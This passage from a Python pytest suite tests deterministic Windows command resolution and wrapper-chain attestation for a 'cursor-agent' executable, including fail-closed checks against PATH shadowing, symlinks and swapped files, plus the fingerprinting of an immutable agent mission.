        ("command_resolution", "wrapper_root_identity"),
        ("selected_version_root_identity",),
    ):
        raw = attestations[0].to_dict()
        target = raw
        for key in identity_path:
            target = target[key]
        target["size"] = 40960
        with pytest.raises(ValueError, match="canonical zero"):
            attestation_from_dict(raw)


@pytest.mark.parametrize("target", ("wrapper", "selected"))
@pytest.mark.parametrize("field", ("st_dev", "st_ino", "st_mode", "st_file_attributes", "st_mtime_ns"))
def test_wrapper_chain_immutable_directory_metadata_changes_block(
    tmp_path: Path, monkeypatch: pytest.MonkeyPatch, target: str, field: str,
):
    wrapper_root, _discovery, attestation = _wrapper_attestation(tmp_path)
    selected_root = wrapper_root / "versions" / attestation.selected_version
    changed_path = wrapper_root if target == "wrapper" else selected_root

    def changed(_index: int, metadata: os.stat_result) -> dict[str, int]:
        value = int(getattr(metadata, field, 0))
        if field == "st_mode":
            changed_mode = value ^ stat.S_IWUSR
            assert stat.S_ISDIR(changed_mode)
            return {field: changed_mode}
        if field == "st_file_attributes":
            return {field: value ^ 0x2}
        return {field: value + 1}

    _override_lstat(monkeypatch, {changed_path: changed})
    with pytest.raises(ValueError, match="identity changed"):
        attestation.validated()


def test_payload_and_attestation_are_byte_reproducible_under_all_alternating_directory_sizes(tmp_path: Path, monkeypatch: pytest.MonkeyPatch):
    wrapper_root = _wrapper_chain_installation(tmp_path)
    selected_root = wrapper_root / "versions" / "2026.07.09-a3815c0"
    discovery = FakeWrapperChainDiscovery(wrapper_root)
    source = tmp_path / "source-repository"; source.mkdir()
    mutable_root = tmp_path / "mutable-execution-root"; mutable_root.mkdir()
    run_root = tmp_path / _V3_RUN_ID
    _override_lstat(monkeypatch, {
        wrapper_root: _alternating_directory_size,
        selected_root: _alternating_directory_size,
        source: _alternating_directory_size,
        mutable_root: _alternating_directory_size,
    })
    source_identities: set[str] = set()
    wrapper_identities: set[str] = set()
    selected_identities: set[str] = set()
    mutable_identities: set[str] = set()
    command_resolution_fingerprints: set[str] = set()
    backend_fingerprints: set[str] = set()
    payload_fingerprints: set[str] = set()
    canonical_payloads: set[bytes] = set()
    canonical_hashes: set[str] = set()
    vector_label = "PRE_COMMIT_PROVISIONAL_NOT_AUTHORIZABLE"
    for _ in range(20):
        attestation = _attest_wrapper_chain_cursor(_WRAPPER_CONFIG, discovery=discovery)
        payload = build_authorization_payload(
            source_repository=source, source_head="e" * 40, run_id=_V3_RUN_ID, session_id=_V3_RUN_ID,
            attestation=attestation, run_root=run_root, timeout_seconds=900,
        )
        _mutable_path, mutable_identity = _safe_directory(mutable_root, "mutable execution root")
        serialized = _canonical_bytes(payload.to_dict())
        reloaded = NativeCanaryAuthorizationPayload.from_dict(json.loads(serialized))
        assert reloaded == payload
        source_identities.add(json.dumps(payload.source_repository_identity.to_dict(), sort_keys=True))
        wrapper_identities.add(json.dumps(attestation.command_resolution.wrapper_root_identity.to_dict(), sort_keys=True))
        selected_identities.add(json.dumps(attestation.selected_version_root_identity.to_dict(), sort_keys=True))
        mutable_identities.add(json.dumps(mutable_identity.to_dict(), sort_keys=True))
        command_resolution_fingerprints.add(fingerprint(attestation.command_resolution.to_dict()))
        backend_fingerprints.add(attestation.attestation_fingerprint)
        payload_fingerprints.add(payload.payload_fingerprint)
        canonical_payloads.add(serialized)
        canonical_hashes.add(hashlib.sha256(serialized).hexdigest())
        assert attestation.command_resolution.wrapper_root_identity.size == 0
        assert attestation.selected_version_root_identity.size == 0
        assert payload.source_repository_identity.size == 0
        assert mutable_identity.size == 0
    assert vector_label == "PRE_COMMIT_PROVISIONAL_NOT_AUTHORIZABLE"
    assert len(source_identities) == len(wrapper_identities) == len(selected_identities) == len(mutable_identities) == 1
    assert len(command_resolution_fingerprints) == len(backend_fingerprints) == len(payload_fingerprints) == 1
    assert len(canonical_payloads) == len(canonical_hashes) == 1


# --- Act 2A.3E: deterministic Windows command-resolution authority ---------

def _path_value(*entries: Path | str) -> str:
    return ";".join(os.fspath(item) for item in entries)


def test_deterministic_windows_resolver_selects_bare_cmd_in_path_and_pathext_order(tmp_path: Path):
    earlier = tmp_path / "earlier"; earlier.mkdir()
    winner_root = tmp_path / "winner"; winner_root.mkdir()
    winner = winner_root / "cursor-agent.cmd"; winner.write_bytes(_OBSERVED_CMD_WRAPPER.encode("ascii"))
    resolved = _deterministic_windows_resolve(
        command="cursor-agent", path_value=_path_value(earlier, winner_root), pathext_value=".COM;.CMD;.EXE",
    )
    assert Path(resolved.winner.canonical_path) == winner.resolve()
    assert resolved.authoritative_path_index == 1
    assert resolved.winning_pathext_index == 1
    assert resolved.path_entries == (str(earlier), str(winner_root))
    assert resolved.pathext == (".COM", ".CMD", ".EXE")
    assert len(resolved.material_candidates) == 1


def test_path_order_changes_winner_and_authority_fingerprint(tmp_path: Path):
    left = tmp_path / "left"; right = tmp_path / "right"; left.mkdir(); right.mkdir()
    (left / "cursor-agent.cmd").write_bytes(b"left")
    (right / "cursor-agent.cmd").write_bytes(b"right")
    first = _deterministic_windows_resolve(command="cursor-agent", path_value=_path_value(left, right), pathext_value=".CMD")
    second = _deterministic_windows_resolve(command="cursor-agent", path_value=_path_value(right, left), pathext_value=".CMD")
    assert first.winner.sha256 != second.winner.sha256
    assert fingerprint(first.to_dict()) != fingerprint(second.to_dict())


def test_pathext_order_changes_winner_and_authority_fingerprint(tmp_path: Path):
    root = tmp_path / "bin"; root.mkdir()
    (root / "cursor-agent.com").write_bytes(b"com")
    (root / "cursor-agent.cmd").write_bytes(b"cmd")
    com_first = _deterministic_windows_resolve(command="cursor-agent", path_value=str(root), pathext_value=".COM;.CMD")
    cmd_first = _deterministic_windows_resolve(command="cursor-agent", path_value=str(root), pathext_value=".CMD;.COM")
    assert Path(com_first.winner.canonical_path).suffix.casefold() == ".com"
    assert Path(cmd_first.winner.canonical_path).suffix.casefold() == ".cmd"
    assert fingerprint(com_first.to_dict()) != fingerprint(cmd_first.to_dict())


def test_missing_cmd_pathext_and_relative_path_component_fail_closed(tmp_path: Path):
    root = tmp_path / "bin"; root.mkdir(); (root / "cursor-agent.cmd").write_bytes(b"cmd")
    with pytest.raises(ValueError, match="found no"):
        _deterministic_windows_resolve(command="cursor-agent", path_value=str(root), pathext_value=".COM;.EXE")
    with pytest.raises(ValueError, match="relative"):
        _deterministic_windows_resolve(command="cursor-agent", path_value=_path_value("relative-bin", root), pathext_value=".CMD")


def test_duplicate_path_entries_are_deterministic_and_fully_bound(tmp_path: Path):
    empty = tmp_path / "empty"; root = tmp_path / "bin"; empty.mkdir(); root.mkdir()
    (root / "cursor-agent.cmd").write_bytes(b"cmd")
    duplicate = _deterministic_windows_resolve(
        command="cursor-agent", path_value=_path_value(empty, empty, root), pathext_value=".CMD",
    )
    single = _deterministic_windows_resolve(
        command="cursor-agent", path_value=_path_value(empty, root), pathext_value=".CMD",
    )
    assert duplicate.authoritative_path_index == 2 and single.authoritative_path_index == 1
    assert _same_file_authority(duplicate.winner, single.winner)
    assert duplicate.path_sha256 != single.path_sha256


def test_empty_path_component_blocks_when_current_directory_can_affect_winner(tmp_path: Path, monkeypatch: pytest.MonkeyPatch):
    later = tmp_path / "later"; later.mkdir()
    (tmp_path / "cursor-agent.cmd").write_bytes(b"cwd shadow")
    (later / "cursor-agent.cmd").write_bytes(b"later")
    monkeypatch.chdir(tmp_path)
    with pytest.raises(ValueError, match="empty PATH component"):
        _deterministic_windows_resolve(
            command="cursor-agent", path_value=";" + str(later), pathext_value=".CMD",
        )


def test_candidate_directory_and_redirecting_candidate_are_rejected(tmp_path: Path):
    directory_root = tmp_path / "directory-root"; directory_root.mkdir(); (directory_root / "cursor-agent.cmd").mkdir()
    with pytest.raises(ValueError, match="regular file"):
        _deterministic_windows_resolve(command="cursor-agent", path_value=str(directory_root), pathext_value=".CMD")

    link_root = tmp_path / "link-root"; link_root.mkdir()
    target = tmp_path / "target.cmd"; target.write_bytes(b"target")
    link = link_root / "cursor-agent.cmd"
    try:
        os.symlink(target, link)
    except (OSError, NotImplementedError):
        pytest.skip("file symlink creation unavailable")
    with pytest.raises(ValueError, match="redirecting"):
        _deterministic_windows_resolve(command="cursor-agent", path_value=str(link_root), pathext_value=".CMD")


def test_conflicting_case_variants_at_same_precedence_position_are_rejected(tmp_path: Path, monkeypatch: pytest.MonkeyPatch):
    root = tmp_path / "root"; left = tmp_path / "left"; right = tmp_path / "right"
    root.mkdir(); left.mkdir(); right.mkdir()
    lower = left / "cursor-agent.cmd"; upper = right / "CURSOR-AGENT.CMD"
    lower.write_bytes(b"lower"); upper.write_bytes(b"upper")
    original = Path.iterdir

    def adversarial_iterdir(path: Path):
        if path == root:
            return iter((lower, upper))
        return original(path)

    monkeypatch.setattr(Path, "iterdir", adversarial_iterdir)
    with pytest.raises(ValueError, match="case variants"):
        _deterministic_windows_resolve(command="cursor-agent", path_value=str(root), pathext_value=".CMD")


@pytest.mark.parametrize("command", ("C:\\Tools\\cursor-agent.cmd", ".\\cursor-agent", "bin/cursor-agent"))
def test_deterministic_resolver_rejects_caller_supplied_command_paths(tmp_path: Path, command: str):
    with pytest.raises(ValueError, match="fixed bare"):
        _deterministic_windows_resolve(command=command, path_value=str(tmp_path), pathext_value=".CMD")


def test_earlier_malicious_candidate_shadows_expected_wrapper_and_powershell_blocks(tmp_path: Path):
    expected_parent = tmp_path / "expected"; expected_parent.mkdir()
    expected = _wrapper_chain_installation(expected_parent)
    malicious = tmp_path / "malicious"; malicious.mkdir()
    malicious_cmd = malicious / "cursor-agent.cmd"; malicious_cmd.write_bytes(_OBSERVED_CMD_WRAPPER.encode("ascii"))
    records = (
        ("ExternalScript", "cursor-agent.ps1", str(expected / "cursor-agent.ps1")),
        ("Application", "cursor-agent.cmd", str(malicious_cmd)),
        ("Application", "cursor-agent.cmd", str(expected / "cursor-agent.cmd")),
    )
    discovery = FakeWrapperChainDiscovery(
        expected, which=str(malicious_cmd), path=_path_value(malicious, expected),
        powershell_records=records, powershell_preferred=records[0],
    )
    with pytest.raises(ValueError, match="out-of-root"):
        _attest_wrapper_chain_cursor(_WRAPPER_CONFIG, discovery=discovery)


def test_deterministic_and_shutil_which_missing_differing_and_replaced_winners_block(tmp_path: Path):
    root = _wrapper_chain_installation(tmp_path)
    with pytest.raises(ValueError, match="shutil.which found no"):
        _attest_wrapper_chain_cursor(_WRAPPER_CONFIG, discovery=FakeWrapperChainDiscovery(root, which_unavailable=True))
    elsewhere = tmp_path / "elsewhere"; elsewhere.mkdir()
    different = elsewhere / "cursor-agent.cmd"; different.write_bytes(_OBSERVED_CMD_WRAPPER.encode("ascii"))
    with pytest.raises(ValueError, match="disagree"):
        _attest_wrapper_chain_cursor(_WRAPPER_CONFIG, discovery=FakeWrapperChainDiscovery(root, which=str(different)))

    class ReplacingWhich(FakeWrapperChainDiscovery):
        def which_cursor_agent(self, *, path_value: str, pathext_value: str) -> str | None:
            path = self.root / "cursor-agent.cmd"
            displaced = self.root / "cursor-agent-original.cmd"
            path.rename(displaced)
            path.write_bytes(_OBSERVED_CMD_WRAPPER.replace("@echo off", "@echo on").encode("ascii"))
            return str(path)

    with pytest.raises(ValueError, match="identity changed|disagree"):
        _attest_wrapper_chain_cursor(_WRAPPER_CONFIG, discovery=ReplacingWhich(root))


@pytest.mark.parametrize("changed", ("path", "pathext"))
def test_path_or_pathext_change_between_request_and_pre_spawn_blocks_with_zero_runner_calls(tmp_path: Path, changed: str):
    h, discovery = _wrapper_chain_harness(tmp_path)
    state = h.session_store.load(h.session_id)
    prompt = build_native_agent_prompt(mission=state.mission, gate_contract=state.current_gate, work_workspace=h.work)
    request = NativeExecutionRequest.create(
        session_id=state.session_id, gate_id=state.current_gate.gate_id, execution_attempt_index=0,
        mission_fingerprint=state.mission.mission_fingerprint,
        gate_contract_fingerprint=state.current_gate.contract_fingerprint,
        work_workspace=h.work, evidence_store_root=h.store.directory, artifact_directory=h.store.artifact_directory,
        attestation=h.attestation, prompt=prompt, timeout_seconds=30, stdout_byte_limit=4096, stderr_byte_limit=2048,
    )
    earlier = tmp_path / "new-earlier-path"; earlier.mkdir()
    if changed == "path":
        discovery.path = _path_value(earlier, discovery.root, "C:\\Windows")
    else:
        discovery.pathext = ".EXE;.COM;.BAT;.CMD"
    with pytest.raises(NativeEvidenceInvalid):
        h.executor.execute(
            request=request, prompt=prompt, source_repository=h.source, canary_parent=h.root,
            allowed_parent_children=frozenset({h.work.name}), evidence_store_root=h.store.directory,
            artifact_directory=h.store.artifact_directory,
        )
    assert h.runner.invocations == []


def test_powershell_inventory_requires_adjacent_wrappers_and_rejects_substitutions(tmp_path: Path):
    root = _wrapper_chain_installation(tmp_path)
    with pytest.raises(ValueError, match="adjacent .ps1"):
        _attest_wrapper_chain_cursor(
            _WRAPPER_CONFIG, discovery=FakeWrapperChainDiscovery(root, powershell=(str(root / "cursor-agent.cmd"),)),
        )
    elsewhere = tmp_path / "elsewhere"; elsewhere.mkdir()
    outside_ps = elsewhere / "cursor-agent.ps1"; outside_ps.write_bytes(_OBSERVED_PS_WRAPPER.encode("utf-8"))
    with pytest.raises(ValueError, match="out-of-root"):
        _attest_wrapper_chain_cursor(
            _WRAPPER_CONFIG,
            discovery=FakeWrapperChainDiscovery(
                root, powershell=(str(outside_ps), str(root / "cursor-agent.cmd")),
                powershell_preferred=("ExternalScript", outside_ps.name, str(outside_ps)),
            ),
        )
    for record in (
        ("Alias", "cursor-agent", ""),
        ("Function", "cursor-agent", ""),
        ("Application", "cursor-agent.exe", str(Path(sys.executable).resolve())),
    ):
        with pytest.raises(ValueError, match="alias|pathless|out-of-root"):
            _attest_wrapper_chain_cursor(
                _WRAPPER_CONFIG,
                discovery=FakeWrapperChainDiscovery(root, powershell_records=(record,), powershell_preferred=record),
            )


def test_powershell_inventory_order_is_canonical_but_material_inventory_change_rebinds(tmp_path: Path):
    root = _wrapper_chain_installation(tmp_path)
    ps = ("ExternalScript", "cursor-agent.ps1", str(root / "cursor-agent.ps1"))
    cmd = ("Application", "cursor-agent.cmd", str(root / "cursor-agent.cmd"))
    first = _attest_wrapper_chain_cursor(
        _WRAPPER_CONFIG,
        discovery=FakeWrapperChainDiscovery(root, powershell_records=(ps, cmd), powershell_preferred=ps),
    )
    reordered = _attest_wrapper_chain_cursor(
        _WRAPPER_CONFIG,
        discovery=FakeWrapperChainDiscovery(root, powershell_records=(cmd, ps), powershell_preferred=ps),
    )
    changed = _attest_wrapper_chain_cursor(
        _WRAPPER_CONFIG,
        discovery=FakeWrapperChainDiscovery(root, powershell_records=(ps, cmd, cmd), powershell_preferred=ps),
    )
    assert first == reordered
    assert changed.attestation_fingerprint != first.attestation_fingerprint
    assert first.command_resolution.powershell_prefers_powershell_wrapper is True


def test_where_diagnostic_variation_is_visible_but_excluded_from_authority_and_payload(tmp_path: Path):
    root = _wrapper_chain_installation(tmp_path)
    source = tmp_path / "source"; source.mkdir()
    run_root = tmp_path / "future-run"
    variants = (
        FakeWrapperChainDiscovery(root),
        FakeWrapperChainDiscovery(root, where=(), where_exit_code=1),
        FakeWrapperChainDiscovery(root, where_unavailable=True),
        FakeWrapperChainDiscovery(root, where_execution_error=True, where_stderr=b"synthetic execution error"),
    )
    observed = tuple(_attest_wrapper_chain_cursor_observed(_WRAPPER_CONFIG, discovery=item) for item in variants)
    assert tuple(item[1].status for item in observed) == (
        WindowsWhereDiagnosticStatus.MATCHING_RESULT,
        WindowsWhereDiagnosticStatus.EMPTY_RESULT,
        WindowsWhereDiagnosticStatus.UNAVAILABLE,
        WindowsWhereDiagnosticStatus.EXECUTION_ERROR,
    )
    attestations = tuple(item[0] for item in observed)
    payloads = tuple(
        build_authorization_payload(
            source_repository=source, source_head="e" * 40, run_id="future-run", session_id="future-run",
            attestation=item, run_root=run_root, timeout_seconds=900,
        )
        for item in attestations
    )
    assert len({item.attestation_fingerprint for item in attestations}) == 1
    assert len({item.payload_fingerprint for item in payloads}) == 1
    assert len({_canonical_bytes(item.to_dict()) for item in payloads}) == 1
    assert "where_diagnostic" not in attestations[0].to_dict()
    assert "where_paths" not in attestations[0].command_resolution.to_dict()


def test_where_matching_stdout_stderr_hash_changes_do_not_change_backend_or_payload(tmp_path: Path):
    root = _wrapper_chain_installation(tmp_path)
    path = str(root / "cursor-agent.cmd")
    source = tmp_path / "source"; source.mkdir()
    first, first_diag = _attest_wrapper_chain_cursor_observed(
        _WRAPPER_CONFIG,
        discovery=FakeWrapperChainDiscovery(root, where_stdout=(path + "\n").encode(), where_stderr=b"first"),
    )
    second, second_diag = _attest_wrapper_chain_cursor_observed(
        _WRAPPER_CONFIG,
        discovery=FakeWrapperChainDiscovery(root, where_stdout=(path + "\r\n").encode(), where_stderr=b"second"),
    )
    assert first_diag.status is second_diag.status is WindowsWhereDiagnosticStatus.MATCHING_RESULT
    assert first_diag.stdout_sha256 != second_diag.stdout_sha256
    assert first_diag.stderr_sha256 != second_diag.stderr_sha256
    assert first == second
    payload_one = build_authorization_payload(
        source_repository=source, source_head="e" * 40, run_id="future-run", session_id="future-run",
        attestation=first, run_root=tmp_path / "future-run", timeout_seconds=900,
    )
    payload_two = build_authorization_payload(
        source_repository=source, source_head="e" * 40, run_id="future-run", session_id="future-run",
        attestation=second, run_root=tmp_path / "future-run", timeout_seconds=900,
    )
    assert payload_one == payload_two


def test_successful_contradictory_where_result_blocks(tmp_path: Path):
    root = _wrapper_chain_installation(tmp_path)
    elsewhere = tmp_path / "elsewhere"; elsewhere.mkdir()
    contradictory = elsewhere / "cursor-agent.cmd"; contradictory.write_bytes(_OBSERVED_CMD_WRAPPER.encode("ascii"))
    with pytest.raises(ValueError, match="where.exe result contradicts"):
        _attest_wrapper_chain_cursor(
            _WRAPPER_CONFIG,
            discovery=FakeWrapperChainDiscovery(root, where=(str(contradictory),), where_exit_code=0),
        )


def test_preflight_only_review_output_exposes_separate_where_diagnostic(tmp_path: Path, monkeypatch: pytest.MonkeyPatch, capsys: pytest.CaptureFixture[str]):
    source_parent = tmp_path / "source-parent"; source_parent.mkdir()
    source = build_canary_repository(source_parent, repository_name="source").repository
    head = _command(["git", "rev-parse", "HEAD"], cwd=source).stdout.strip()
    root, discovery, attestation = _wrapper_attestation(tmp_path)
    _same_attestation, diagnostic = _attest_wrapper_chain_cursor_observed(_WRAPPER_CONFIG, discovery=discovery)
    decision = NativePreflightDecision(
        NativePreflightStatus.PREFLIGHT_READY, WRAPPER_CHAIN_READY_REASON,
        "synthetic deterministic review", attestation, diagnostic,
    )
    monkeypatch.setattr("admissible.delegated_gate.native_canary.preflight_native_cursor", lambda *, config: decision)
    run_root = tmp_path / "review-run"
    args = [
        "--source-repository", str(source), "--required-source-head", head,
        "--run-root", str(run_root), "--run-id", "review-run", "--session-id", "review-run",
        "--executable", "cursor-agent", "--attestation-class", "wrapper-chain",
        "--model", "auto", "--timeout-seconds", "900", "--preflight-only",
    ]
    assert main(args) == 0
    emitted = json.loads(capsys.readouterr().out)
    assert emitted["where_diagnostic"] == diagnostic.to_dict()
    assert emitted["attestation"] == attestation.to_dict()
    assert not run_root.exists()


def test_wrapper_v1_is_inert_even_when_refingerprinted_and_v2_round_trips(tmp_path: Path):
    source = tmp_path / "source"; source.mkdir()
    _root, _discovery, attestation = _wrapper_attestation(tmp_path)
    assert attestation.schema_version == WRAPPER_CHAIN_ATTESTATION_SCHEMA_VERSION
    assert attestation_from_dict(attestation.to_dict()) == attestation
    legacy = attestation.to_dict()
    legacy["schema_version"] = WRAPPER_CHAIN_ATTESTATION_SCHEMA_VERSION_LEGACY_V1
    legacy["attestation_fingerprint"] = fingerprint({
        key: value for key, value in legacy.items() if key != "attestation_fingerprint"
    })
    with pytest.raises(ValueError, match="legacy wrapper-chain v1.*inert"):
        attestation_from_dict(legacy)
    legacy_object = replace(
        attestation, schema_version=WRAPPER_CHAIN_ATTESTATION_SCHEMA_VERSION_LEGACY_V1,
        attestation_fingerprint=legacy["attestation_fingerprint"],
    )
    with pytest.raises(ValueError, match="unsupported wrapper-chain"):
        legacy_object.validated()
    with pytest.raises(ValueError, match="unsupported wrapper-chain"):
        build_authorization_payload(
            source_repository=source, source_head="e" * 40, run_id="future-run", session_id="future-run",
            attestation=legacy_object, run_root=tmp_path / "future-run", timeout_seconds=900,
        )


def test_prior_wrapper_v1_payload_non_claim_shape_is_invalid_even_when_refingerprinted(tmp_path: Path):
    source = tmp_path / "source"; source.mkdir()
    _root, _discovery, attestation = _wrapper_attestation(tmp_path)
    payload = build_authorization_payload(
        source_repository=source, source_head="e" * 40, run_id="future-run", session_id="future-run",
        attestation=attestation, run_root=tmp_path / "future-run", timeout_seconds=900,
    )
    prior = payload.to_dict()
    prior["attestation_non_claims"] = list(WRAPPER_CHAIN_NON_CLAIMS[:-2])
    prior["payload_fingerprint"] = fingerprint({key: value for key, value in prior.items() if key != "payload_fingerprint"})
    with pytest.raises(ValueError, match="non-claims"):
        NativeCanaryAuthorizationPayload.from_dict(prior)


# --- Act 2A.3G: immutable mission stop-after-commit binding ----------------

_ACT_2A_3G_MISSION = """Add deterministic high-score persistence to this small game-state package.
Implement the feature across the existing source modules, add tests using the existing Node test runner,
run the complete npm test suite, update the README, and create one local Git commit with the exact message
`feat: add deterministic high-score persistence`. Do not add a remote and do not push. Stop after the local commit."""
_ACT_2A_3G_MISSION_FINGERPRINT = "1a296853942d359647a12fe7875bac32898690a1fafd16c8d02993c471ae687e"
_ACT_2A_3G_GATE_PLAN_FINGERPRINT = "fdde35a25b3f88d87474b7ba6dabd0c3cbb1134bac9269b7ae3dafd810d0ddbf"
_ACT_2A_GATE_CONTRACT_FINGERPRINT = "603d7a09d4a3ce48f5ad21b2d754b6c7a946f6fcc88d9337d3f516c8f2312379"


def test_act_2a_3g_immutable_mission_plan_and_prompt_bind_stop_clause(tmp_path: Path):
    h = _harness(tmp_path)
    state = create_canary_session(session_id="act-2a-3g-mission-binding")
    prompt = build_native_agent_prompt(
        mission=state.mission, gate_contract=state.current_gate, work_workspace=h.work,
    )
    request, request_prompt = _request(h)

    assert CANARY_MISSION == _ACT_2A_3G_MISSION
    assert CANARY_MISSION.endswith("Stop after the local commit.")
    assert len(CANARY_MISSION.encode("utf-8")) == 402 != 373
    assert state.mission.specification == _ACT_2A_3G_MISSION
    assert state.mission.mission_fingerprint == _ACT_2A_3G_MISSION_FINGERPRINT
    assert state.mission.mission_fingerprint != "f663f7e63d51c503ce9712544c0026874ce05931452e63b3c04431a4aa457726"
    assert state.gate_plan.immutable_mission_fingerprint == _ACT_2A_3G_MISSION_FINGERPRINT
    assert state.gate_plan.plan_fingerprint == _ACT_2A_3G_GATE_PLAN_FINGERPRINT
    assert state.gate_plan.plan_fingerprint != "d433560c437fe2f7744c46dfc44913feb39fd7dab566e8957779d3fdc6db9600"
    assert state.current_gate.contract_fingerprint == _ACT_2A_GATE_CONTRACT_FINGERPRINT
    assert f"Immutable mission:\n{_ACT_2A_3G_MISSION}\n\nCurrent gate objective:" in prompt
    assert prompt.count("Stop after the local commit.") == 1
    assert "- stop immediately after the local commit." in prompt
    assert request_prompt == build_native_agent_prompt(
        mission=h.session_store.load(h.session_id).mission,
        gate_contract=h.session_store.load(h.session_id).current_gate,
        work_workspace=h.work,
    )
    assert request.prompt_fingerprint == hashlib.sha256(request_prompt.encode("utf-8")).hexdigest()
    assert (MAX_PROVIDER_INVOCATIONS, MAX_NATIVE_PHASE_ATTEMPTS, MAX_REPAIR_ROUNDS, MAX_AUDITOR_INVOCATIONS, MAX_RETRIES) == (1, 1, 0, 0, 0)


def test_act_2a_3g_corrected_payload_cannot_match_invalidated_act_2a_3f_vector(tmp_path: Path):
    h = _harness(tmp_path)
    payload = build_authorization_payload(
        source_repository=h.source,
        source_head=_command(["git", "rev-parse", "HEAD"], cwd=h.source).stdout.strip(),
        run_id="act-2a-3g-preview", session_id="act-2a-3g-preview",
        attestation=h.attestation, run_root=tmp_path / "future-run", timeout_seconds=30,
    )
    canonical_payload = _canonical_bytes(payload.to_dict())

    assert payload.mission_fingerprint == _ACT_2A_3G_MISSION_FINGERPRINT
    assert payload.gate_plan_fingerprint == _ACT_2A_3G_GATE_PLAN_FINGERPRINT
    assert payload.gate_contract_fingerprint == _ACT_2A_GATE_CONTRACT_FINGERPRINT
    assert payload.payload_fingerprint != "a6f4340ce0e3acfcdb63f1455de8d753de412a8fffa3f2531bf08e57d9b3e28e"
    assert hashlib.sha256(canonical_payload).hexdigest() != "f0c83a2634f853bea66afe8c2b8f161e9374c3d717180499b8c652c935c9f311"
